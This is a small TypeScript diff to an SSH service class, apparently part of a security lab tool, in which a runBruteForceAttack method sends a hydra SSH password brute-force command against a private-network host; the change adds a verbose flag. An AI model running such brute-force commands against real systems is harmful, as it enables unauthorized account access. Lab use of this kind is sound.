@@ -91,6 +91,6 @@ export class ApiSshService {
   }
 
   runBruteForceAttack() {
-    this.socket.emit('command', 'hydra -L username.txt -P password.txt 192.168.56.102 -t 4 ssh\r');
+    this.socket.emit('command', 'hydra -V -L username.txt -P password.txt 192.168.56.102 -t 4 ssh\r');
   }
 }
